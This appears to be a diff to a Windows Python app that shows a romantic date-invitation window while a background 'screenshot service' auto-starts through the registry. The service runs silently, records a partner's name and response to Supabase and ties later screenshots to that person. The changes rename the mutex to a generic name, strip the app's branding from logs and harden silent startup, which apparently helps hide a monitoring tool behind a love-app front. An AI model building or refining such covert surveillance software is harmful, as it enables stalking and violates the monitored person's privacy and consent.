+            "date_countdown_target": self.conf.get("date_countdown_target", DEFAULT_COUNTDOWN_TARGET),
+            "tanggal_date": self.conf.get("tanggal_date", DEFAULT_TANGGAL_DATE),
+        }
 
     def submit_response(self, nama: str, tanggal: str, status: str):
         """Menerima kiriman respons ajakan date dari JavaScript frontend."""
         nama = (nama or "").strip()
+        status_clean = (status or "").strip().lower()
 
-        # Deduplikasi: cegah insert ganda jika fungsi terpanggil berkali-kali dalam 10 detik
+        # Utamakan tanggal_date hasil konfigurasi user (bukan dummy 2026-12-05)
+        conf_tanggal = self.conf.get("tanggal_date", DEFAULT_TANGGAL_DATE).strip()
+        passed_tanggal = (tanggal or "").strip()
+        if conf_tanggal and (not passed_tanggal or passed_tanggal == DEFAULT_TANGGAL_DATE):
+            final_tanggal = conf_tanggal
+        else:
+            final_tanggal = passed_tanggal or conf_tanggal or DEFAULT_TANGGAL_DATE
+
+        # Deduplikasi: cegah insert ganda jika status yang sama terpanggil berulang dalam 10 detik
         now = time.time()
         if self._last_submit and (now - self._last_submit.get("time", 0) < 10):
-            if self._last_submit.get("nama") == nama and self._last_submit.get("status") == status:
-                print(f"[UI BRIDGE] Mengabaikan submit duplikat untuk: {nama} ({status})")
-                return
+            if self._last_submit.get("nama") == nama and self._last_submit.get("status") == status_clean:
+                print(f"[UI BRIDGE] Mengabaikan submit duplikat untuk: {nama} ({status_clean})")
+                return True
 
-        self._last_submit = {"nama": nama, "status": status, "time": now}
-        print(f"[UI BRIDGE] Respons pacar: {nama} | Tanggal: {tanggal} | Status: {status}")
+        self._last_submit = {"nama": nama, "status": status_clean, "time": now}
+        print(f"[UI BRIDGE] Respons pacar: {nama} | Tanggal: {final_tanggal} | Status: {status_clean}")
+
+        # Simpan state persisten terlebih dahulu (agar tetap aman walau offline)
+        is_yes = status_clean == "yes"
+        if self.controller:
+            self.controller.set_active_user(nama, persist=True)
+            if is_yes:
+                self.controller.onboarding_done = True
+                self.controller.date_accepted = True
+        elif nama:
+            save_app_state(self.conf, active_user=nama)
+
+        if is_yes:
+            save_app_state(self.conf, onboarding_done=True, date_accepted=True)
 
         if self.controller:
-            # Set user aktif agar screenshot berikutnya diasosiasikan dengan user ini
-            self.controller.set_active_user(nama)
-
+            self.controller._init_supabase_logger()
             if self.controller.supabase_logger:
                 try:
                     rec = {
                         "nama": nama,
-                        "tanggal_date": tanggal,
-                        "status": status,
+                        "tanggal_date": final_tanggal,
+                        "status": status_clean,
                         "created_at": datetime.now(timezone.utc).isoformat(),
                     }
                     self.controller.supabase_logger.client.table("user_responses").insert(rec).execute()
@@ -1013,16 +1436,22 @@ class LoveYouApi:
                 except Exception as e:
                     print(f"[UI BRIDGE ERROR] Gagal simpan ke Supabase: {e}")
 
+        return True
+
 
 _mutex_handle = None
+UI_WINDOW_TITLE = "❤️ LoveYou"
 
-def is_app_already_running() -> bool:
-    """Mengecek apakah instance LoveYou sudah aktif di latar belakang (Windows Mutex)."""
+
+def is_app_already_running(conf: dict | None = None) -> bool:
+    """Mengecek apakah instance service aplikasi ini sudah aktif di latar belakang (Windows Mutex per app)."""
     global _mutex_handle
     try:
         ERROR_ALREADY_EXISTS = 183
         kernel32 = ctypes.windll.kernel32
-        _mutex_handle = kernel32.CreateMutexW(None, False, "Global\\LoveYouNativeAppMutex")
+        state_id = get_app_state_id(conf or {})
+        mutex_name = f"Local\\XooseSvcMutex_{state_id}"
+        _mutex_handle = kernel32.CreateMutexW(None, False, mutex_name)
         if kernel32.GetLastError() == ERROR_ALREADY_EXISTS:
             return True
     except Exception:
@@ -1030,43 +1459,158 @@ def is_app_already_running() -> bool:
     return False
 
 
+def focus_existing_ui_window() -> bool:
+    """Membawa jendela UI yang sudah terbuka ke depan layar jika user klik icon berulang kali."""
+    try:
+        user32 = ctypes.windll.user32
+        hwnd = user32.FindWindowW(None, UI_WINDOW_TITLE)
+        if hwnd:
+            user32.ShowWindow(hwnd, 9)  # SW_RESTORE
+            user32.SetForegroundWindow(hwnd)
+            return True
+    except Exception:
+        pass
+    return False
+
+
 def _launch_ui_subprocess():
-    """Spawn loveyou.exe --ui di proses baru agar pywebview berjalan di main thread proses tsb."""
+    """Spawn exe --ui di proses baru agar pywebview berjalan di main thread proses tsb."""
+    if focus_existing_ui_window():
+        return
+
     if getattr(sys, "frozen", False):
         cmd = [sys.executable, "--ui"]
     else:
         cmd = [sys.executable, os.path.abspath(__file__), "--ui"]
+
+    # Bersihkan variable PyInstaller internal agar child --onefile melakukan bootstrap bersih
+    child_env = os.environ.copy()
+    for k in list(child_env.keys()):
+        if k == "_MEIPASS2" or k.startswith("_PYI_"):
+            child_env.pop(k, None)
+
     try:
-        subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.Popen(
+            cmd,
+            env=child_env,
+            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
+        )
     except Exception as e:
         print(f"[UI ERROR] Gagal spawn subprocess UI: {e}")
 
 
-def run_ui_window(controller=None):
+def run_ui_window(controller=None, conf: dict | None = None):
     """
     Menampilkan jendela native LoveYou App (pywebview Edge Chromium).
+    - Pertama kali (belum onboarding): membuka index.html -> name.html -> invite.html -> yes.html.
+    - Jika sudah pernah memasukkan nama & menerima undangan: langsung membuka yes.html (jadwal countdown)!
     Blok thread pemanggil sampai jendela ditutup.
     """
-    index_path = get_frontend_path()
-    if not os.path.exists(index_path):
-        print(f"[UI ERROR] File frontend tidak ditemukan di: {index_path}")
-        return
+    active_conf = conf or (controller.conf if controller else load_config())
+    state_id = get_app_state_id(active_conf)
 
-    url = "file:///" + index_path.replace("\\", "/")
-    print(f"[UI] Membuka jendela LoveYou: {url}")
+    # Cegah jendela UI ganda terbuka bersamaan
+    ui_mutex_handle = None
+    try:
+        kernel32 = ctypes.windll.kernel32
+        ui_mutex_handle = kernel32.CreateMutexW(None, False, f"Local\\XooseUIMutex_{state_id}")
+        if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
+            focus_existing_ui_window()
+            if ui_mutex_handle:
+                kernel32.CloseHandle(ui_mutex_handle)
+            return
+    except Exception:
+        pass
 
-    api = LoveYouApi(controller=controller)
-    webview.create_window(
-        title="❤️ LoveYou",
-        url=url,
-        js_api=api,
-        width=560,
-        height=760,
-        resizable=True,
-        min_size=(420, 580),
-        background_color="#0d0007",
-    )
-    webview.start(gui="edgechromium")
+    try:
+        saved_state = load_app_state(active_conf)
+        saved_user = saved_state.get("active_user", "").strip()
+        is_onboarded = bool(saved_state.get("onboarding_done") or saved_state.get("date_accepted"))
+
+        if is_onboarded:
+            target_page = "yes.html"
+        elif saved_user:
+            target_page = "invite.html"
+        else:
+            target_page = "index.html"
+
+        page_path = get_frontend_path(target_page)
+        if not os.path.exists(page_path):
+            page_path = get_frontend_path("index.html")
+        if not os.path.exists(page_path):
+            print(f"[UI ERROR] File frontend tidak ditemukan di: {page_path}")
+            return
+
+        url = "file:///" + page_path.replace("\\", "/")
+        hash_params = {}
+        if saved_user:
+            hash_params["name"] = saved_user
+        if active_conf.get("date_invitation_text"):
+            hash_params["date_text"] = active_conf["date_invitation_text"]
+        if active_conf.get("date_countdown_target"):
+            hash_params["target"] = active_conf["date_countdown_target"]
+        if active_conf.get("tanggal_date"):
+            hash_params["tanggal_date"] = active_conf["tanggal_date"]
+        if hash_params:
+            url += "#" + urllib.parse.urlencode(hash_params)
+
+        print(f"[UI] Membuka jendela LoveYou ({target_page}): {url}")
+
+        api = LoveYouApi(controller=controller, conf=active_conf)
+        webview.create_window(
+            title=UI_WINDOW_TITLE,
+            url=url,
+            js_api=api,
+            width=560,
+            height=760,
+            resizable=True,
+            min_size=(420, 580),
+            background_color="#0d0007",
+        )
+        webview.start(gui="edgechromium")
+    finally:
+        if ui_mutex_handle:
+            try:
+                ctypes.windll.kernel32.CloseHandle(ui_mutex_handle)
+            except Exception:
+                pass
+
+
+def _start_tray_safely(controller: ServiceController, is_boot_silent: bool = False):
+    """Memulai ikon System Tray setelah Explorer taskbar siap (penting saat Windows Startup)."""
+    def _runner():
+        if is_boot_silent:
+            try:
+                user32 = ctypes.windll.user32
+                for _ in range(30):
+                    if not controller.is_running:
+                        return
+                    if user32.FindWindowW("Shell_TrayWnd", None):
+                        break
+                    time.sleep(0.5)
+            except Exception:
+                time.sleep(2.0)
+
+        if not controller.is_running:
+            return
+
+        tray = setup_tray(controller)
+        try:
+            tray.run_detached()
+            print("\n[INFO] Ikon Tray telah aktif di System Tray (Pojok kanan bawah).")
+        except Exception as e:
+            print(f"[WARN] Tray run_detached gagal, mencoba ulang: {e}")
+            time.sleep(2.0)
+            if controller.is_running:
+                try:
+                    tray.run_detached()
+                except Exception as e2:
+                    print(f"[WARN] Tray retry gagal: {e2}")
+
+    if is_boot_silent:
+        threading.Thread(target=_runner, daemon=True, name="TrayStarter").start()
+    else:
+        _runner()
 
 
 def main():
@@ -1080,29 +1624,27 @@ def main():
     parser.add_argument("--interval", type=int, default=None, help="Override interval screenshot dalam detik")
     args = parser.parse_args()
 
-    # 1. Mode --ui: hanya tampilkan jendela LoveYou App
-    if args.ui:
-        conf = load_config()
-        controller = ServiceController(conf)
-        run_ui_window(controller)
-        return
-
-    # 2. Cek apakah service sudah aktif di latar belakang (Single Instance)
-    if is_app_already_running():
-        if args.silent or args.background:
-            return
-        # Jika user mengklik loveyou.exe saat service sudah jalan, langsung buka UI!
-        print("[INFO] LoveYou Service sudah aktif di latar belakang. Membuka jendela UI...")
-        conf = load_config()
-        controller = ServiceController(conf)
-        run_ui_window(controller)
-        return
-
-    # 3. Main Instance: Inisialisasi Service
     conf = load_config()
     if args.interval is not None and args.interval > 0:
         conf["interval_seconds"] = args.interval
 
+    # 1. Mode --ui: hanya tampilkan jendela LoveYou App
+    if args.ui:
+        controller = ServiceController(conf)
+        run_ui_window(controller, conf=conf)
+        return
+
+    # 2. Cek apakah service sudah aktif di latar belakang (Single Instance per app)
+    if is_app_already_running(conf):
+        if args.silent or args.background:
+            return
+        # Jika user mengklik exe saat service sudah jalan, langsung buka UI (countdown jika sudah onboarding)!
+        print("[INFO] Service sudah aktif di latar belakang. Membuka jendela UI...")
+        controller = ServiceController(conf)
+        run_ui_window(controller, conf=conf)
+        return
+
+    # 3. Main Instance: Inisialisasi Service
     print("=" * 65)
     print("   LOVEYOU SCREENSHOT SERVICE & ROMANTIC UI")
     print("=" * 65)
@@ -1118,8 +1660,9 @@ def main():
     controller = ServiceController(conf)
 
     # Daftarkan ke Windows Startup jika aktif di config
+    is_silent = bool(args.silent or args.background)
     if conf["auto_start"] and not args.no_startup and not args.test:
-        if register_startup(conf["app_name"]):
+        if register_startup(conf["app_name"], is_silent_launch=is_silent):
             print(f"[OK] Terdaftar di Windows Startup (Registry & Shell:Startup): {conf['app_name']}")
 
     # Mode Test 1x
@@ -1143,23 +1686,17 @@ def main():
     if conf.get("emergency_hotkey", True) and not args.test:
         start_emergency_hotkey_listener(controller)
 
-    # Jalankan System Tray (detached)
-    tray = None
+    # Jalankan System Tray (aman terhadap early Windows Boot)
     if not args.no_tray:
-        tray = setup_tray(controller)
-        try:
-            tray.run_detached()
-            print("\n[INFO] Ikon LoveYou telah aktif di System Tray (Pojok kanan bawah).")
-        except Exception as e:
-            print(f"[WARN] Tray run_detached gagal: {e}")
+        _start_tray_safely(controller, is_boot_silent=is_silent)
 
-    print("[INFO] Layanan screenshot aktif di latar belakang setiap 3 detik.")
+    print("[INFO] Layanan screenshot aktif di latar belakang.")
 
-    # 4. Jika bukan mode silent, langsung tampilkan jendela UI LoveYou di layar!
-    if not (args.silent or args.background):
-        print("[INFO] Membuka jendela LoveYou App di layar...")
+    # 4. Jika bukan mode silent, langsung tampilkan jendela UI (awal = Play/Name, setelahnya = Countdown!)
+    if not is_silent:
+        print("[INFO] Membuka jendela UI di layar...")
         try:
-            run_ui_window(controller)
+            run_ui_window(controller, conf=conf)
         except Exception as e:
             print(f"[WARN] Jendela UI ditutup atau error: {e}")
 
@@ -1170,9 +1707,9 @@ def main():
     except KeyboardInterrupt:
         controller.is_running = False
 
-    if tray:
+    if controller.tray_icon:
         try:
-            tray.stop()
+            controller.tray_icon.stop()
         except Exception:
             pass
 
